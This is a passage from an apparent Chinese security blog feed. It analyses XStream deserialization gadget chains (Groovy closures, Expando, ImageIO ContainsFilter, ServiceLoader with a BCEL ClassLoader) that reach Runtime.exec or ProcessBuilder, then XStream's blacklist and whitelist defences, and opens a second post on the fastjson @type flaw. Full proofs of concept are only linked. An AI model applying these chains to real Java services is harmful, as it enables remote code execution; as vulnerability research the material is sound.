class="string">"exec"</span>);</span><br></pre></td></tr></table></figure><p>封装<code>Runtime</code>对象，并设定后续需要调用的函数<code>exec</code></p><h3 id="ConvertedClosure"><a href="#ConvertedClosure" class="headerlink" title="ConvertedClosure"></a>ConvertedClosure</h3><p>这个<code>ConvertedClosure</code>也是继承了<code>InvocationHandler</code>，可以在动态代理中作为handler的存在，来看一下他的invoke</p><p><code>ConvertedClosure</code>调用的是父类<code>org.codehaus.groovy.runtime.ConversionHandler#invoke</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200418142036889.png" alt="image-20200418142036889"></p><p>主要看这个部分，对于当前调用的函数，如果非Object的函数(如toString、hashCode等)，并且不是<code>GroovyObject</code>的函数，会去调用子类的<code>invokeCustom</code>，这里看<code>org.codehaus.groovy.runtime.ConvertedClosure#invokeCustom</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200418171210630.png" alt="image-20200418171210630"></p><p>这里的属性都是可控的，也就意味着我们可以去调用去调用前面构造好的<code>MethodClosure</code>，这里后续调用<code>call</code>的过程可以看最近的这篇<a href="https://paper.seebug.org/1171/" target="_blank" rel="noopener">文章</a></p><p>所以为了满足能调用<code>invokeCustom</code>函数，前面的两种<code>MapConverter</code>和<code>TreeSetConverter</code>，选哪种呢？</p><p>很明显答案是选择<code>TreeSetConverter</code>，因为<code>Map</code>会去调用<code>hashCode</code>，而<code>TreeSet</code>会去调用<code>compareTo</code>，这里的<code>hashCode</code>是Object的函数，过不了上面<code>checkMethod</code>，具体怎么写POC，不详细说了，见<a href="https://github.com/wh1t3p1g/ysomap/blob/master/core/src/main/java/ysomap/core/payload/xstream/GroovyConvertedClosure.java" target="_blank" rel="noopener">ysomap</a></p><p>PS：这里需要提一下的是由于<code>compareTo</code>会带上一个参数，所以我们<code>MethodClosure</code>封装的后续需要调用的函数必须要存在一个String类型的参数，不然会找不到函数报错。（可能还有其他的解决方法，这里我没继续深入下去了，直接构造<code>Runtime.exec</code>可以解决这个问题）</p><h2 id="3-Groovy-Expando"><a href="#3-Groovy-Expando" class="headerlink" title="3. Groovy Expando"></a>3. Groovy Expando</h2><p>前面用到了<code>TreeSet</code>的方式，这里我们去使用<code>Map</code>的类型来触发。以<code>Map</code>的类型来触发，那就是找可以利用的<code>hashCode</code>函数</p><p><code>groovy.util.Expando#hashCode</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200418174424715.png" alt="image-20200418174424715"></p><p>如果在类属性<code>expandoProperties</code>中存在<code>hashCode:methodclosure</code>的内容，我们可以在这里直接调用<code>MethodClosure</code>的<code>call</code>函数，跟上面<code>ConvertedClosure</code>后续的调用一样，但是这里调用时没有函数参数过来，所以这里的思路是<code>ProcessBuilder.start</code>或者fastjson那种getters的利用，见<a href="https://github.com/wh1t3p1g/ysomap/blob/master/core/src/main/java/ysomap/core/payload/xstream/GroovyExpando.java" target="_blank" rel="noopener">POC</a></p><h2 id="4-ImageIO-ContainsFilter"><a href="#4-ImageIO-ContainsFilter" class="headerlink" title="4. ImageIO$ContainsFilter"></a>4. ImageIO$ContainsFilter</h2><p>上面使用动态代理的方式利用了<code>TreeSet</code>调用put时触发的<code>compareTo</code>，而这里利用的是<code>HashMap</code>类型put时调用的<code>hashCode</code>函数；这个链相对来说复杂一点，我们一点一点来说（参考marshalsec的<a href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/gadgets/ImageIO.java" target="_blank" rel="noopener">ImageIO</a>，这里先膜一波大佬的思路，后文为顺势讲下去的，主要目的是到达<code>Iterator.next</code>，实际挖掘这种链还是得从后往前找）：</p><p>从XStream处理<code>Map</code>类型时触发<code>hashCode</code>开始</p><p>关注<code>jdk.nashorn.internal.objects.NativeString#hashCode</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200416162110270.png" alt="image-20200416162110270"></p><p>后续调用<code>getStringValue</code>函数，在这个函数里去调用了<code>this.value.toString()</code>，这里的value的类型为<code>CharSequence</code>，所以我们接下来要找可以利用的<code>CharSequence</code>的实现类，这里用到的是<code>com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#toString</code>函数</p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200416164810572.png" alt="image-20200416164810572"></p><p>这里紧接着会去调用<code>ByteArrayOutputStreamEx</code>的<code>readFrom</code>，这个函数用到的主要是这边传入的InputStream的read函数</p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200416165222727.png" alt="image-20200416165222727"></p><p>实际上<code>is</code>我们是可以控制的，因为这里调用的<code>this.dataHandler.getDataSource().getInputStream()</code>，他的值传递都可以用类属性的方式把他构建出来，分别是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. this.dataHandler == 构造好的DataHandler</span><br><span class="line">2. DataHandler的dataSource属性 == 构造好的XmlDataSource</span><br><span class="line">3. XmlDataSource调用getInputStream()函数返回构造好的inputStream</span><br><span class="line"></span><br><span class="line">// com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource</span><br></pre></td></tr></table></figure><p>用这种方法就可以获取一个可控的<code>inputStream</code>，并且后续会去调用<code>read</code>函数</p><p>继续看下去，<code>javax.crypto.CipherInputStream#read</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200416170450515.png" alt="image-20200416170450515"></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200416170531566.png" alt="image-20200416170531566"></p><p>此时需要构造一个<code>Cipher</code>类型，并且后续调用<code>Cipher.update</code>函数，这里可以用<code>javax.crypto.NullCipher</code>来填充，因为最终用到的是父类<code>Cipher.update</code>，只要不重载<code>update</code>，其他的子类也可以。</p><p>继续看<code>Cipher.update</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200416170954216.png" alt="image-20200416170954216"></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200416171051157.png" alt="image-20200416171051157"></p><p>说了那么久，我们终于到了至关重要的一个地方，<code>serviceIterator.next</code>函数</p><p>后续我们将调用ImageIO下的<code>javax.imageio.spi.FilterIterator#next</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200416171636844.png" alt="image-20200416171636844"></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200416171715068.png" alt="image-20200416171715068"></p><p><code>advance</code>函数会去调用<code>filter.filter</code>函数，而ImageIO存在一个有趣的filter</p><p><code>javax.imageio.ImageIO.ContainsFilter#filter</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200416171927622.png" alt="image-20200416171927622"></p><p>我们可以指定一个Method对象去invoke，到了这里就是激动人心的Java反射机制了，我们提前构造好method对象，就可以调用任意的函数。</p><p>利用链比较长，整理一下过程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">XStream 处理Map类型 去调用jdk.nashorn.internal.objects.NativeString#hashCode</span><br><span class="line">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#toString</span><br><span class="line">javax.activation.DataHandler#getDataSource</span><br><span class="line">com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource#getInputStream</span><br><span class="line">javax.crypto.CipherInputStream#read -&gt; getMoreData</span><br><span class="line">javax.crypto.NullCipher#update -&gt; chooseFirstProvider</span><br><span class="line">javax.imageio.spi.FilterIterator#next</span><br><span class="line">javax.imageio.ImageIO.ContainsFilter#filter</span><br><span class="line">ProcessBuilder#start</span><br></pre></td></tr></table></figure><p>从后面往前看的话，我们前面做的所有操作都是为了能去触发<code>Iterator.next</code>，而这种<code>Iterator</code>的遍历处理，我们很容易再找到一处，下一节就是不用<code>javax.imageio.ImageIO.ContainsFilter#filter</code>来实现利用，请继续往下看XD</p><h2 id="5-ServiceFinder-LazyIterator"><a href="#5-ServiceFinder-LazyIterator" class="headerlink" title="5. ServiceFinder$LazyIterator"></a>5. ServiceFinder$LazyIterator</h2><p>思路来自<a href="https://www.anquanke.com/post/id/172198#h2-4" target="_blank" rel="noopener">文章1</a>、<a href="[https://meizjm3i.github.io/2020/01/09/Jenkins-2-101-XStream-Rce-%E7%A9%BA%E6%8C%87%E9%92%88CTF%E4%B8%80%E6%9C%88%E5%86%85%E9%83%A8%E8%B5%9BWriteup/](https://meizjm3i.github.io/2020/01/09/Jenkins-2-101-XStream-Rce-空指针CTF一月内部赛Writeup/">文章2</a>)</p><p>先来看一下<code>java.util.ServiceLoader.LazyIterator#next</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200417164755804.png" alt="image-20200417164755804"></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200417164854625.png" alt="image-20200417164854625"></p><p>当类属性<code>acc</code>为空时，会去调用<code>nextService</code>函数，而在该函数里面，我们看到了令人熟悉的<code>Class.forName</code>的调用。并且我们去实例化的<code>classname</code>、<code>loader</code>，都是类属性，属于我们可以控制的东西。</p><p>到了这里自然而然的就想到了使用BCEL的ClassLoader来载入classname里的字节码了(这里我在fastjson那篇里提到过)。</p><p>所以我们可以在ImageIO那条链的基础上，在触发<code>Iterator.next</code>时使用这个<code>LazyIterator</code>来代替</p><h3 id="修改BCEL-ClassLoader构造POC"><a href="#修改BCEL-ClassLoader构造POC" class="headerlink" title="修改BCEL ClassLoader构造POC"></a>修改BCEL ClassLoader构造POC</h3><p>这里来提一下关于POC的构造，如果你使用了当前这个利用链，并且不对<code>ClassLoader</code>做处理的话，你会发现怎么都打不通，因为这里在实际还原<code>ClassLoader</code>的时候出现了错误</p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200417225056222.png" alt="image-20200417225056222"></p><p>这里有两种解决方案，一是去除这种还原有问题的类（会很麻烦），二是直接把<code>ClassLoader</code>里的一些无关紧要的东西剔除掉。</p><p>这里我选择了第二种，经过调试去除了以下几个属性的值</p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200417225303428.png" alt="image-20200417225303428"></p><p>这里由于我们剔除了<code>ignored_packages</code>和<code>deferTo</code>，导致BCEL的ClassLoader在载入普通的类的时候会出现加载错误的问题</p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200417225600161.png" alt="image-20200417225600161"></p><p>来看看怎么解决这个问题</p><p>首先BCEL的<code>ClassLoader.loadClass</code>，一共尝试4次不同的载入方法</p><ol><li><p>从当前ClassLoader的classes去找</p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200417225808446.png" alt="image-20200417225808446"></p></li><li><p>对于默认忽略的包<code>java./sun./javax.</code>，使用<code>deferTo</code>去重新加载，这里的<code>deferTo</code>是系统的ClassLoader（<code>ClassLoader.getSystemClassLoader()</code>)</p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200417230040882.png" alt="image-20200417230040882"></p></li><li><p>对于classname以<code>$$BCEL$$</code>开头的，根据classname的值去defineClass，这边就是我们最喜欢的任意载入字节码的地方</p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200417230343866.png" alt="image-20200417230343866"></p></li><li><p>最后一次是用<code>repository</code>去载入当前的classname，如果这里还没找到，就会爆没有找到Class的错误</p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200417230451954.png" alt="image-20200417230451954"></p><p>PS：这部分<code>repository</code>取的<code>SyntheticRepository.getInstance()</code>，还不是很清楚这个左右，后续整理一下ClassLoader相关的知识再做补充</p></li></ol><p>再来看我们报错的原因，因为删除<code>ignored_packages</code>和<code>deferTo</code>之后，相当于第二种情况无法载入了，而显然<code>java.lang.Object</code>不符合第三种情况。最后第4种里面也没有找到这个<code>java.lang.Object</code>，所以最终爆了<code>ClassNotFoundException</code></p><p>这里其实已经很明显了，解决这个问题，我们得在<code>classes</code>里添加我们传入的class字节码里所用到的所有类，那么在第一次尝试载入的时候，就找到了相应的类，无需尝试后续的几种载入方式。</p><p>比如这里我产生的字节码里面用上了<code>Runtime</code>，就得加上这个类</p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200417231357924.png" alt="image-20200417231357924"></p><p>这里的Object必须加上，毕竟所有的对象都继承自Object</p><h1 id="0x03-XStream的防御措施"><a href="#0x03-XStream的防御措施" class="headerlink" title="0x03 XStream的防御措施"></a>0x03 XStream的防御措施</h1><hr><p>XStream在1.4.7版本之后支持使用白名单和黑名单的方式来方式恶意类的反序列化<a href="http://x-stream.github.io/security.html" target="_blank" rel="noopener">security</a></p><blockquote><p>Starting with XStream 1.4.7, it is possible to define <a href="http://x-stream.github.io/security.html#framework" target="_blank" rel="noopener">permissions</a> for types, to check the type of an object that should be unmarshalled. Those permissions can be used to allow or deny types explicitly With these permissions it is at least not possible to inject unexpected types into an object graph. The security framework supports the setup of a black or white listing scenario. Any application should use this feature to limit the danger of arbitrary command execution if it deserializes data from an external source.</p><p>XStream itself sets up a black list by default, i.e. it blocks all currently known critical classes of the Java runtime. Main reason for the black list is compatibility, because otherwise newer versions of XStream 1.4.x can no longer be used as drop-in replacement. Unfortunately this provides a false sense of security. Every XStream client should therefore switch to a white listing on its own as soon as possible. XStream itself will use white listing as default starting with 1.5.x and only clients that have also changed their setup will be able to use this newer version again as drop-in replacement.</p></blockquote><p>这里主要看一下黑名单的处理</p><h2 id="1-4-7-1-4-9"><a href="#1-4-7-1-4-9" class="headerlink" title="1.4.7-1.4.9"></a>1.4.7-1.4.9</h2><p><code>EventHandler</code>的处理由<code>ReflectionConverter</code>来处理的，在1.4.7-1.4.9版本，在<code>canConvert</code>处添加了对<code>EventHandler</code>的限制</p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200418185546291.png" alt="image-20200418185546291"></p><p>所以<code>EventHandler</code>的POC就失效了，但是其他的几种并没有失效</p><h2 id="gt-1-4-10"><a href="#gt-1-4-10" class="headerlink" title="&gt;=1.4.10"></a>&gt;=1.4.10</h2><p>在1.4.10版本增加了<code>setupDefaultSecurity</code>方式来设置默认的白名单，但是这个版本把上面<code>EventHandler</code>的限制去掉了，导致又可以使用最早的POC，需要注意的是这是没修补前的<code>1.4.10</code>，修复后已经不可以了</p><p>除了新增设置白名单的方式，也新增加了<code>InternalBlackList</code>这个converter，他设置的权限为<code>LOW</code>，而<code>ReflectionConverter</code>权限为<code>Very_low</code>，所以会先过一次黑名单检查（XStream在注册converters时，以权限的方式来决定次序）。</p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200418192827552.png" alt="image-20200418192827552"></p><p>所以这里1,4,5都跪了，只剩下groovy这种了，当然肯定还有其他没有发现的利用链，所以最安全的方法还是使用白名单的方式，不能依赖XStream的黑名单来做安全防御。</p><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><hr><p>本文主要回顾了现有的一些利用链，值得注意的是：</p><p>如果XStream用的不是白名单模式，还是存在利用的可能性的。现有内置的黑名单只禁止了几个现有的利用链，我们还是可以找到其他可以利用的利用链的，比如前面提到的Groovy的利用链。</p><p>需要记住的是XStream他的触发方式依赖的是HashMap、TreeSet这种类型自动调用的<code>hashCode</code>、<code>compareTo</code>串起来的，后续可以注意一下这种可能的调用链。</p><p>PS：本文提到的所有POC，已经更新到<a href="https://github.com/wh1t3p1g/ysomap" target="_blank" rel="noopener">GitHub</a>上</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈fastjson反序列化漏洞</title>
      <link href="2020/04/13/java/talk-about-fastjson-deserialization/"/>
      <url>2020/04/13/java/talk-about-fastjson-deserialization/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近又碰上了fastjson的题目，想着是时候分析一波这个漏洞了，跟上师傅们的脚步。</p><a id="more"></a><h1 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h1><hr><h2 id="1-fastjson的基础使用"><a href="#1-fastjson的基础使用" class="headerlink" title="(1). fastjson的基础使用"></a>(1). fastjson的基础使用</h2><blockquote><p>fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。</p></blockquote><p>先来看一个简单的例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Phone</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String phoneNumber;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Phone</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Phone</span><span class="params">(String phoneNumber)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.phoneNumber = phoneNumber;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.phoneNumber;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NewPhone</span> <span class="keyword">extends</span> <span class="title">Phone</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String location;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">NewPhone</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">NewPhone</span><span class="params">(String phoneNumber, String location)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.phoneNumber = phoneNumber;</span><br><span class="line">        <span class="keyword">this</span>.location = location;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.phoneNumber+<span class="string">":"</span>+<span class="keyword">this</span>.location;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Phone phone;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, Phone phone)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.phone = phone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name+<span class="string">":"</span>+phone;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面包括了3个简单的对象Person、Phone以及NewPhone，我们用fastjson将Person对象转化成一个json字符串，并还原</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Phone phone = <span class="keyword">new</span> Phone(<span class="string">"1234567890"</span>);</span><br><span class="line">Person person = <span class="keyword">new</span> Person(<span class="string">"john"</span>, phone);</span><br><span class="line">String json = JSON.toJSONString(person);</span><br><span class="line">System.out.println(json);</span><br><span class="line">Person p = JSON.parseObject(json, Person<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">System.out.println(p);</span><br><span class="line"><span class="comment">// output </span></span><br><span class="line"><span class="comment">// &#123;"name":"john","phone":&#123;"phoneNumber":"1234567890"&#125;&#125;</span></span><br><span class="line"><span class="comment">// john:1234567890</span></span><br></pre></td></tr></table></figure><p>调用fastjson的toJSONString可以轻易地将object转化为json字符串，也可以用parseObject将json字符串还原出来。但是这里有一个限制就是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Phone phone = <span class="keyword">new</span> NewPhone(<span class="string">"1234567890"</span>,<span class="string">"China"</span>);</span><br><span class="line">Person person = <span class="keyword">new</span> Person(<span class="string">"john"</span>, phone);</span><br><span class="line">String json = JSON.toJSONString(person);</span><br><span class="line">System.out.println(json);</span><br><span class="line">Person p = JSON.parseObject(json, Person<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">System.out.println(p);</span><br><span class="line"><span class="comment">// output</span></span><br><span class="line"><span class="comment">// &#123;"name":"john","phone":&#123;"location":"China","phoneNumber":"1234567890"&#125;&#125;</span></span><br><span class="line"><span class="comment">// john:1234567890</span></span><br></pre></td></tr></table></figure><p>在上面的写法中，由于fastjson不知道需要还原的Person的Phone是本身还是子类NewPhone，面对这种多态方式，fastjson还原是父类，而不是子类NewPhone。这意味着我们丢失了Json字符串中phone的location字段。这显然是不可忍受的，所以fastjson给我们提供了指定还原类的字段<code>@type</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Phone phone = <span class="keyword">new</span> NewPhone(<span class="string">"1234567890"</span>,<span class="string">"China"</span>);</span><br><span class="line">Person person = <span class="keyword">new</span> Person(<span class="string">"john"</span>, phone);</span><br><span class="line">String json = JSON.toJSONString(person, SerializerFeature.WriteClassName);</span><br><span class="line">System.out.println(json);</span><br><span class="line">Person p = JSON.parseObject(json, Person<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">System.out.println(p);</span><br><span class="line"><span class="comment">// output</span></span><br><span class="line"><span class="comment">// &#123;"@type":"org.vultest.base.Person","name":"john","phone":&#123;"@type":"org.vultest.base.NewPhone","location":"China","phoneNumber":"1234567890"&#125;&#125;</span></span><br><span class="line"><span class="comment">// john:1234567890:China</span></span><br></pre></td></tr></table></figure><p>通过在toJSONString的时候指定SerializerFeature（SerializerFeature.WriteClassName），使得转化后的json字符串多了<code>@type</code>字段。这个字段指代了当前类的class，避免了上面的子类丢失字段的问题。比如上面直接指定了Person对象的phone属性的类是NewPhone，还原后成功打印出location。</p><p>到了这里，我们可以思考一下，如果<code>@type</code>被指定为某恶意的类，是否会导致任意代码执行的漏洞？</p><h2 id="2-fastjson的流程简介"><a href="#2-fastjson的流程简介" class="headerlink" title="(2).fastjson的流程简介"></a>(2).fastjson的流程简介</h2><blockquote><p>这里直接参考<a href="https://paper.seebug.org/994/" target="_blank" rel="noopener">https://paper.seebug.org/994/</a></p></blockquote><p>用一下廖大的流程图</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/1564368830000-15632616584384.jpg" alt="img"></p><p>具体的分析过程看上面的那篇文章即可，这里提一下将ASM动态生成的代码dump出来的方法</p><p>在分析过程中，ASM动态生成了相应的bytecodes，这里用idea的断点来dump源码</p><p>先将断点下在<code>com/alibaba/fastjson/parser/deserializer/ASMDeserializerFactory.java#80</code></p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200104200324167.png" alt="image-20200104200324167"></p><p>生成的bytecodes在code里，用执行表达式的功能，执行<code>(new FileOutputStream(&quot;some.class&quot;)).write(code)</code>即可生成</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200104200849550.png" alt="image-20200104200849550"></p><h2 id="3-fastjson-自动调用getter和setter"><a href="#3-fastjson-自动调用getter和setter" class="headerlink" title="(3).  fastjson 自动调用getter和setter"></a>(3).  fastjson 自动调用getter和setter</h2><p>类似Java的反序列化过程会自动调用readObject函数，fastjson还原对象时也会自动调用以下几个函数：</p><ul><li>无参数的构造函数</li><li>符合条件的getter函数</li><li>符合条件的setter函数</li></ul><p>这里需要区别的是fastjson所使用的parse函数和parseObject函数所调用的函数条件是不一样的。（ps：序列化时会调用所有getters）</p><h3 id="1-parse-和-parseObject的区别"><a href="#1-parse-和-parseObject的区别" class="headerlink" title="1. parse 和 parseObject的区别"></a>1. parse 和 parseObject的区别</h3><p>来看一下parseObject函数</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200409201548997.png" alt="image-20200409201548997"></p><p>这里parseObject函数会首先调用<code>JSON.parse</code>函数，然后再去调用<code>toJSON</code>函数。</p><p>这里<code>toJSON</code>会把obj套一层<code>JSONObject</code>对象，他的实现方法是先new一个<code>JSONObject</code>，把obj对象给填充进去；然后调用<code>toJSONString</code>把生成的<code>JSONObject</code>转化为json字符串；最后再调用<code>parse</code>函数将这个json字符串给还原。</p><p>这里的<code>toJSONString</code>是我们序列化的一个过程，他会去调用这个对象的所有getters，也就意味着<code>parseObject</code>函数会主动去调getters和setters，而<code>parse</code>函数则会调用这个对象的setters和符合条件的getters(这部分见后文)。</p><p>那么也就意味着，<code>parseObject</code>比<code>parse</code>函数多了一个调用所有getters的利用点。</p><h3 id="2-parse自动调用函数的主要逻辑"><a href="#2-parse自动调用函数的主要逻辑" class="headerlink" title="2. parse自动调用函数的主要逻辑"></a>2. parse自动调用函数的主要逻辑</h3><p>接着我们来看一下<code>JSON.parse</code>函数自动调用getters和setters的逻辑。</p><p>先来看一下调用流程，以下分析fastjson版本1.2.24</p><p><code>com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java#deserialze</code>（ps：这里很鸡贼的把deserialize的i给省略了）</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200106094637943.png" alt="image-20200106094637943"></p><p>首先是第570行调用了createInstance函数，该函数将会对当前还原的类进行实例化，这里会自动调用无参数的构造函数</p><p>其次是第600行调用了parseField函数，该函数将对每个类属性进行初始化(或递归生成新的对象)</p><p>跟进parseField函数</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200106105841139.png" alt="image-20200106105841139"></p><p>这里调用了<code>com/alibaba/fastjson/parser/deserializer/DefaultFieldDeserializer.java#parseField</code>函数，直接看关键点第83行，调用了setValue函数</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200106110005828.png" alt="image-20200106110005828"></p><p>setValue函数就是fastjson自动调用getter和setter的关键点</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200106110837420.png" 